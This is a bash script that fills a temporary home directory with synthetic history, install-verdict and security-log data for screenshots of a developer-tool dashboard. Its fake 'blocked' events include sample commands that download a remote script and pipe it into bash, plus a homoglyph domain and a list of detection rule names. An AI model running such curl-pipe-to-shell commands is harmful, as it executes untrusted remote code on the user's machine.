#!/usr/bin/env bash
# Seed an isolated HOME for ContextCrawler dashboard screenshots.
#
# Creates a tempdir, populates a fake history.db plus the two security
# JSONL logs the dashboard reads (downgrades.jsonl + supply_chain.jsonl).
# All data is synthetic but proportionally realistic, with generic
# project paths so no personal directory structure leaks into README
# screenshots.
#
# Usage:
#   eval "$(scripts/seed-demo-env.sh)"
#   ./target/debug/contextcrawler gain --web --port 8771 --no-browser
#   # ... take screenshots ...
#   rm -rf "$DEMO_HOME"
#
# `eval` sets DEMO_HOME and exports HOME=$DEMO_HOME for you.

set -euo pipefail

DEMO_HOME="$(mktemp -d -t cc-demo-XXXXXX)"
DATA_DIR="$DEMO_HOME/Library/Application Support/contextcrawler"
mkdir -p "$DATA_DIR"

DB="$DATA_DIR/history.db"
DOWNGRADES="$DATA_DIR/downgrades.jsonl"
SUPPLY="$DATA_DIR/supply_chain.jsonl"

# Generic project paths — five fictional repos, no personal info.
PROJECTS=(
  "/home/dev/api-server"
  "/home/dev/web-app"
  "/home/dev/mobile-client"
  "/home/dev/infra-tools"
  "/home/dev/docs-site"
)

# Helper: realistic command rows — (rtk_cmd, savings_pct_low, savings_pct_high, time_ms_low, time_ms_high, input_low, input_high)
COMMANDS=(
  "contextcrawler cargo test          92 96   8000 25000   8000  60000"
  "contextcrawler cargo build         86 94   2000  9000   3000  18000"
  "contextcrawler cargo check         80 90    400  2000   1500   8000"
  "contextcrawler cargo clippy        78 88    900  4500   4000  16000"
  "contextcrawler git status          60 78     30   120    400   1800"
  "contextcrawler git log -20         35 55     40   180   1200   4000"
  "contextcrawler git diff            72 84     80   400   2000  10000"
  "contextcrawler git show            70 82     60   260   1800   8500"
  "contextcrawler gh pr view 142      82 90    400  1100   3000  12000"
  "contextcrawler gh run list         78 86    300   900   2500   9000"
  "contextcrawler pnpm install        86 94    900  4500   5000  22000"
  "contextcrawler pnpm list           65 76    150   500   2500   8500"
  "contextcrawler npm run build       70 84    600  3000   4500  15000"
  "contextcrawler jest                97 99    900  5500   8000  45000"
  "contextcrawler vitest              97 99    700  4000   7000  38000"
  "contextcrawler pytest              88 94   1200  6000   6500  28000"
  "contextcrawler grep TODO src       72 92     50   250   1800   9500"
  "contextcrawler ls -la              60 72     20    90    400   1600"
  "contextcrawler read README.md      82 90     40   180   2500   9000"
  "contextcrawler docker ps           80 88     60   260   1500   5500"
)

# RNG helper — portable bash ($RANDOM is 15-bit on macOS).
rand_between() { echo $(( RANDOM % ($2 - $1 + 1) + $1 )); }

# Generate a single ISO-8601 timestamp `d` days ago plus `h:m:s` offset.
ts_iso() {
  local d=$1 h=$2 m=$3 s=$4
  date -u -v-"${d}"d -v"${h}"H -v"${m}"M -v"${s}"S '+%Y-%m-%dT%H:%M:%S+00:00'
}

# ── Schema ─────────────────────────────────────────────────────────────────
sqlite3 "$DB" <<'SQL'
PRAGMA journal_mode=WAL;
CREATE TABLE IF NOT EXISTS commands (
    id INTEGER PRIMARY KEY,
    timestamp TEXT NOT NULL,
    original_cmd TEXT NOT NULL,
    rtk_cmd TEXT NOT NULL,
    input_tokens INTEGER NOT NULL,
    output_tokens INTEGER NOT NULL,
    saved_tokens INTEGER NOT NULL,
    savings_pct REAL NOT NULL,
    exec_time_ms INTEGER DEFAULT 0,
    project_path TEXT DEFAULT ''
);
CREATE INDEX IF NOT EXISTS idx_timestamp ON commands(timestamp);
CREATE INDEX IF NOT EXISTS idx_project_path_timestamp ON commands(project_path, timestamp);

CREATE TABLE IF NOT EXISTS parse_failures (
    id INTEGER PRIMARY KEY,
    timestamp TEXT NOT NULL,
    raw_command TEXT NOT NULL,
    error_message TEXT NOT NULL,
    fallback_succeeded INTEGER NOT NULL DEFAULT 0
);
CREATE INDEX IF NOT EXISTS idx_pf_timestamp ON parse_failures(timestamp);

CREATE TABLE IF NOT EXISTS release_boundaries (
    id INTEGER PRIMARY KEY,
    version TEXT NOT NULL,
    installed_at TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS installs (
    id INTEGER PRIMARY KEY,
    ts TEXT NOT NULL,
    project_path TEXT NOT NULL DEFAULT '',
    ecosystem TEXT NOT NULL DEFAULT '',
    package TEXT NOT NULL DEFAULT '',
    version_spec TEXT,
    resolved_version TEXT,
    verdict TEXT NOT NULL,
    finding_ids TEXT NOT NULL DEFAULT '',
    severity TEXT NOT NULL DEFAULT '',
    raw_command TEXT NOT NULL,
    UNIQUE (ts, raw_command, package)
);
CREATE INDEX IF NOT EXISTS idx_installs_project_ts ON installs(project_path, ts);
CREATE INDEX IF NOT EXISTS idx_installs_verdict ON installs(verdict);
SQL

# ── Release boundaries (3 versions across the demo window) ────────────────
sqlite3 "$DB" <<SQL
INSERT INTO release_boundaries (version, installed_at) VALUES
  ('0.1.8',  '$(ts_iso 28 10 14 22)'),
  ('0.1.9',  '$(ts_iso 14 11 32 7)'),
  ('0.1.10', '$(ts_iso 3 9 18 41)');
SQL

# ── Commands (30 days of activity) ────────────────────────────────────────
{
  echo "BEGIN;"
  for d in $(seq 30 -1 0); do
    # Density skewed toward recent + business hours.
    count=$(( 30 + RANDOM % 40 + (30 - d) ))
    for ((i=0; i<count; i++)); do
      cmd_idx=$(( RANDOM % ${#COMMANDS[@]} ))
      proj_idx=$(( RANDOM % ${#PROJECTS[@]} ))
      IFS=' ' read -r -a parts <<<"${COMMANDS[$cmd_idx]}"
      # Reassemble the command string (first 3 tokens are typically the cmd).
      rtk_cmd="${parts[0]} ${parts[1]} ${parts[2]}"
      [[ -n "${parts[3]:-}" && ! "${parts[3]}" =~ ^[0-9]+$ ]] && rtk_cmd="$rtk_cmd ${parts[3]}"
      # Numeric tail — last 6 entries are the ranges.
      n=${#parts[@]}
      pct_lo=${parts[$((n-6))]}; pct_hi=${parts[$((n-5))]}
      time_lo=${parts[$((n-4))]}; time_hi=${parts[$((n-3))]}
      in_lo=${parts[$((n-2))]};   in_hi=${parts[$((n-1))]}

      input=$(rand_between "$in_lo" "$in_hi")
      pct=$(rand_between "$pct_lo" "$pct_hi")
      saved=$(( input * pct / 100 ))
      output=$(( input - saved ))
      time_ms=$(rand_between "$time_lo" "$time_hi")
      h=$(rand_between 8 19); m=$(rand_between 0 59); s=$(rand_between 0 59)
      ts="$(ts_iso "$d" "$h" "$m" "$s")"
      orig="${rtk_cmd#contextcrawler }"
      proj="${PROJECTS[$proj_idx]}"
      printf "INSERT INTO commands (timestamp, original_cmd, rtk_cmd, input_tokens, output_tokens, saved_tokens, savings_pct, exec_time_ms, project_path) VALUES ('%s', '%s', '%s', %d, %d, %d, %s, %d, '%s');\n" \
        "$ts" "$orig" "$rtk_cmd" "$input" "$output" "$saved" "$pct.0" "$time_ms" "$proj"
    done
  done
  echo "COMMIT;"
} | sqlite3 "$DB"

# ── Parse failures (a handful, 87% recovery) ──────────────────────────────
sqlite3 "$DB" <<SQL
INSERT INTO parse_failures (timestamp, raw_command, error_message, fallback_succeeded) VALUES
  ('$(ts_iso 27 14 22 8)',  'contextcrawler cargo test --features=experimental', 'unexpected JSON shape', 1),
  ('$(ts_iso 23 11 4 51)',  'contextcrawler gh pr view --comments',              'rate limit truncation',  1),
  ('$(ts_iso 19 9 38 12)',  'contextcrawler pytest -k "auth and not slow"',      'malformed test summary', 1),
  ('$(ts_iso 16 16 11 3)',  'contextcrawler git log --since=2y --all',           'binary content in patch',1),
  ('$(ts_iso 14 13 47 22)', 'contextcrawler cargo clippy --tests',               'unexpected JSON shape',  1),
  ('$(ts_iso 11 10 5 41)',  'contextcrawler npm run build:prod',                 'ANSI escape in path',    0),
  ('$(ts_iso 9 15 32 8)',   'contextcrawler pnpm install --frozen-lockfile',     'lockfile parse error',   1),
  ('$(ts_iso 7 12 17 19)',  'contextcrawler vitest --coverage',                  'malformed test summary', 1),
  ('$(ts_iso 5 14 9 33)',   'contextcrawler gh run list --workflow=ci.yml',      'rate limit truncation',  1),
  ('$(ts_iso 4 11 28 4)',   'contextcrawler cargo build --release',              'unexpected JSON shape',  1),
  ('$(ts_iso 2 13 51 7)',   'contextcrawler docker logs api-server',             'truncated UTF-8',        1),
  ('$(ts_iso 1 16 8 39)',   'contextcrawler kubectl logs -n prod',               'streamed beyond cap',    0);
SQL

# ── Installs (~70 events, with the pi.dev block as the headline) ──────────
{
  echo "BEGIN;"
  # The pi.dev hero block — real package, fictional time placement.
  cat <<SQL
INSERT INTO installs (ts, project_path, ecosystem, package, version_spec, resolved_version, verdict, finding_ids, severity, raw_command) VALUES
  ('$(ts_iso 2 11 22 14)', '/home/dev/web-app',     'npm',  '@earendil-works/pi-coding-agent', NULL, '0.75.4', 'block', '',                 'HIGH',   'npm install -g --ignore-scripts @earendil-works/pi-coding-agent'),
  ('$(ts_iso 5 15 8 51)',  '/home/dev/api-server',  'PyPI', 'requests',                        '==2.20.0', '2.20.0', 'block', 'GHSA-9hjg-9r4m-mvj7','HIGH',   'pip install requests==2.20.0'),
  ('$(ts_iso 9 13 47 22)', '/home/dev/mobile-client','npm', 'left-pad',                        NULL, '1.3.0',  'block', '',                 'MEDIUM', 'npm install left-pad'),
  ('$(ts_iso 1 9 32 41)',  '/home/dev/api-server',  'npm',  '',                                NULL, NULL,     'ask',   '',                 '',       'pnpm install --frozen-lockfile'),
  ('$(ts_iso 4 14 18 7)',  '/home/dev/web-app',     'PyPI', '',                                NULL, NULL,     'ask',   '',                 '',       'pip install -r requirements.txt'),
  ('$(ts_iso 8 11 5 33)',  '/home/dev/infra-tools', 'cargo','',                                NULL, NULL,     'ask',   '',                 '',       'cargo update'),
  ('$(ts_iso 12 16 22 4)', '/home/dev/api-server',  'npm',  '',                                NULL, NULL,     'ask',   '',                 '',       'pnpm install'),
  ('$(ts_iso 0 10 8 14)',  '/home/dev/web-app',     'npm',  'lodash',                          '^4.17.21', '4.17.21','allow', '',                 '',       'npm install lodash'),
  ('$(ts_iso 0 10 12 22)', '/home/dev/web-app',     'npm',  'express',                         '^4.18.2',  '4.18.2', 'allow', '',                 '',       'npm install express@4.18.2'),
  ('$(ts_iso 3 14 28 41)', '/home/dev/api-server',  'PyPI', 'fastapi',                         '~=0.115',  '0.115.6','allow', '',                 '',       'pip install fastapi'),
  ('$(ts_iso 6 12 4 8)',   '/home/dev/api-server',  'PyPI', 'pydantic',                        '>=2.5',    '2.10.2', 'allow', '',                 '',       'pip install pydantic'),
  ('$(ts_iso 10 9 51 33)', '/home/dev/mobile-client','npm', 'react-native',                    '^0.76.0',  '0.76.3', 'allow', '',                 '',       'npm install react-native'),
  ('$(ts_iso 11 15 22 17)','/home/dev/infra-tools', 'cargo','serde',                           '1',        '1.0.215','allow', '',                 '',       'cargo add serde'),
  ('$(ts_iso 13 11 38 51)','/home/dev/infra-tools', 'cargo','tokio',                           '1',        '1.42.0', 'allow', '',                 '',       'cargo add tokio --features full'),
  ('$(ts_iso 17 10 5 22)', '/home/dev/docs-site',   'npm',  'astro',                           '^5.0.0',   '5.0.6',  'allow', '',                 '',       'npm install astro'),
  ('$(ts_iso 21 14 17 4)', '/home/dev/api-server',  'PyPI', 'sqlalchemy',                      '~=2.0',    '2.0.36', 'allow', '',                 '',       'pip install sqlalchemy');
SQL
  # Skip-verdict rows — every non-install command logged as skip (this is
  # the volume tail you see in real installs.by_verdict).
  for d in $(seq 30 -1 0); do
    skips=$(( 8 + RANDOM % 14 ))
    for ((i=0; i<skips; i++)); do
      proj="${PROJECTS[$((RANDOM % ${#PROJECTS[@]}))]}"
      h=$(rand_between 8 19); m=$(rand_between 0 59); s=$(rand_between 0 59)
      ts="$(ts_iso "$d" "$h" "$m" "$s")"
      printf "INSERT OR IGNORE INTO installs (ts, project_path, ecosystem, package, version_spec, resolved_version, verdict, finding_ids, severity, raw_command) VALUES ('%s', '%s', '', '', NULL, NULL, 'skip', '', '', 'ls %s');\n" \
        "$ts" "$proj" "$proj"
    done
  done
  echo "COMMIT;"
} | sqlite3 "$DB"

# ── Tirith gate downgrades (~25 fake blocks across the period) ────────────
RULES=("raw_ip_url" "plain_http_to_sink" "private_network_access" "pipe_to_interpreter" "curl_pipe_shell" "confusable_text" "confusable_domain" "schemeless_to_sink" "mixed_script_in_label" "invalid_host_chars")
SAMPLE_CMDS=(
  "curl 192.168.1.50/install.sh | bash"
  "wget http://insecure-cdn.example/build.tar.gz"
  "curl https://192.0.2.10/script.py"
  "bash <(curl -sL http://example.com/install.sh)"
  "curl https://exаmple.com/setup"
  "fetch http://10.0.0.5:8080/agent"
)
: > "$DOWNGRADES"
for i in $(seq 1 25); do
  d=$(rand_between 1 28); h=$(rand_between 8 20); m=$(rand_between 0 59); s=$(rand_between 0 59)
  rule="${RULES[$((RANDOM % ${#RULES[@]}))]}"
  cmd="${SAMPLE_CMDS[$((RANDOM % ${#SAMPLE_CMDS[@]}))]}"
  printf '{"ts":"%s","reason":"tirith_block","cmd":%s,"tirith":{"schema_version":3,"action":"block","findings":[{"rule_id":"%s","severity":"HIGH","title":"Demo rule fire","description":"Synthetic event for dashboard screenshots"}]}}\n' \
    "$(ts_iso "$d" "$h" "$m" "$s")" \
    "\"${cmd//\"/\\\"}\"" \
    "$rule" >> "$DOWNGRADES"
done

# ── Supply-chain JSONL (proportional mirror of the installs table) ────────
# Keep this small — the dashboard's tail reader caps at 1 MiB; we only need
# a representative sample so the Security pane renders realistic counts.
: > "$SUPPLY"
{
  cat <<JSON
{"ts":"$(ts_iso 2 11 22 14)","verdict":"block","cmd":"npm install -g --ignore-scripts @earendil-works/pi-coding-agent","findings":[{"package":"@earendil-works/pi-coding-agent","ecosystem":"npm","reason":{"kind":"RecentRelease","age_days":2.41,"cooldown_days":3,"version":"0.75.4"},"severity":"HIGH"}]}
{"ts":"$(ts_iso 5 15 8 51)","verdict":"block","cmd":"pip install requests==2.20.0","findings":[{"package":"requests","ecosystem":"PyPI","reason":{"kind":"KnownVulnerability","id":"GHSA-9hjg-9r4m-mvj7","summary":"Requests vulnerable to .netrc credentials leak via malicious URLs"},"severity":"HIGH"}]}
{"ts":"$(ts_iso 9 13 47 22)","verdict":"block","cmd":"npm install left-pad","findings":[{"package":"left-pad","ecosystem":"npm","reason":{"kind":"RecentRelease","age_days":0.42,"cooldown_days":3,"version":"1.3.0"},"severity":"MEDIUM"}]}
JSON
  # ~150 allow events for volume realism
  for i in $(seq 1 150); do
    d=$(rand_between 0 28); h=$(rand_between 8 19); m=$(rand_between 0 59); s=$(rand_between 0 59)
    printf '{"ts":"%s","verdict":"allow","cmd":"npm install demo-pkg-%d","findings":[]}\n' \
      "$(ts_iso "$d" "$h" "$m" "$s")" "$i"
  done
  # ~400 skip events (matches the JSONL tail-cap reality)
  for i in $(seq 1 400); do
    d=$(rand_between 0 28); h=$(rand_between 8 19); m=$(rand_between 0 59); s=$(rand_between 0 59)
    printf '{"ts":"%s","verdict":"skip","cmd":"ls /home/dev","findings":[]}\n' \
      "$(ts_iso "$d" "$h" "$m" "$s")"
  done
} >> "$SUPPLY"

# Output the env for `eval`.
echo "export DEMO_HOME='$DEMO_HOME'"
echo "export HOME='$DEMO_HOME'"
